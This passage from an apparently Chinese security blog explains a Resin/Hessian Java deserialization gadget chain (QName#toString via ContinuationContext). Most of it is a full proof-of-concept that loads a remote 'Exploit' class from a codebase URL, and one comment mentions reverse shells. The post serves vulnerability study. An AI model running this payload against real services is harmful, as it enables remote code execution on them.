class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.HessianChains;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResinQnamePoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*Hessian2Input#readObject()-&gt;</span></span><br><span class="line"><span class="comment">         *   HashMap#putVal()-&gt;</span></span><br><span class="line"><span class="comment">         *       XString#equals()-&gt;</span></span><br><span class="line"><span class="comment">         *           QName#toString()-&gt;</span></span><br><span class="line"><span class="comment">         *               ContinuationContext#composeName()-&gt;</span></span><br><span class="line"><span class="comment">         *                   URLClassLoader#newInstance()</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取ContinuationContext的构造方法</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ctor = cls.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//分别构造一个CannotProceedException对象和一个Hashtable对象</span></span><br><span class="line">        <span class="comment">//配置一个cpe并将恶意的Reference对象加载进去</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line">        cpe.setResolvedObj(refObj);</span><br><span class="line">        <span class="comment">//实例化一个Hashtable对象</span></span><br><span class="line">        Hashtable&lt;?, ?&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span>  (Context) ctor.newInstance(cpe,hashtable);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">QName</span> <span class="variable">qname</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(context,<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(qname.hashCode());  <span class="comment">//unhash的目的是为了绕过hashmap的hashcode判断，进入equals</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发toString方法</span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里的顺序很重要，不然在调用equals方法时可能调用的是JSONArray.equals(XString)</span></span><br><span class="line">        hashmap1.put(<span class="string">&quot;yy&quot;</span>,qname);</span><br><span class="line">        hashmap1.put(<span class="string">&quot;zZ&quot;</span>,xString);</span><br><span class="line">        hashmap2.put(<span class="string">&quot;yy&quot;</span>,xString);</span><br><span class="line">        hashmap2.put(<span class="string">&quot;zZ&quot;</span>,qname);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> makeMap(hashmap1,hashmap2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] poc = Hessian2_serialize(map);</span><br><span class="line">        Hessian2_unserialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> ( target &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( target == Integer.MIN_VALUE )</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span> <span class="params">( StringBuilder partial, <span class="type">int</span> target )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//hashmap的put实际上就是，这个具体用法我也不清楚</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 这里是在通过反射添加map的元素，而非put添加元素，因为put添加元素会导致在put的时候就会触发RCE，</span></span><br><span class="line">        <span class="comment">// 一方面会导致报错异常退出，代码走不到序列化那里；另一方面如果是命令执行是反弹shell，还可能会导致反弹的是自己的shell而非受害者的shell</span></span><br><span class="line">        setFieldValue(map, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>); <span class="comment">//设置size为2，就代表着有两组</span></span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  <span class="comment">//通过此处来设置的0组和1组，我去，破案了</span></span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(map, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field_name, Object field_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(field_name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, field_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hessian依赖的序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_serialize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hessian依赖的反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>函数调用栈</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121145907328.png" alt="image-20251121145907328"></p>
+<p>unhash的目的是为了绕过hashmap的hashcode判断，进入equals，并且这条链子不是通过HashMap的readObject方法去触发，因为Hessian在反序列化的时候会触发HashMap的put方法，进而触发putVal方法</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121150419712.png" alt="image-20251121150419712"></p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121150450044.png" alt="image-20251121150450044"></p>
+<h2 id="ROME反序列化调用任意getter方法"><a href="#ROME反序列化调用任意getter方法" class="headerlink" title="ROME反序列化调用任意getter方法"></a>ROME反序列化调用任意getter方法</h2><p>从上面的代码可以看到，getTargetContext函数本质上是属于getter方法，那么不难想到用ROME的ToStringBean#toString方法去触发任意getter方法</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Resin%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">Resin介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">影响版本&amp;环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QName-toString%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">QName#toString利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QNAME-toString"><span class="toc-number">3.1.</span> <span class="toc-text">QNAME#toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContinuationContext-composeName"><span class="toc-number">3.2.</span> <span class="toc-text">ContinuationContext#composeName</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-XString%E8%A7%A6%E5%8F%91toString"><span class="toc-number">3.3.</span> <span class="toc-text">HashMap+XString触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E9%93%BE%E5%AD%901"><span class="toc-number">3.3.1.</span> <span class="toc-text">最终链子1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88POC1"><span class="toc-number">3.3.2.</span> <span class="toc-text">最终POC1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8Fgetter%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">ROME反序列化调用任意getter方法</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Java反序列化之Resin反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Java反序列化之Resin反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化之Resin反序列化&body=Check out this article: https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Java反序列化之Resin反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Java反序列化之Resin反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
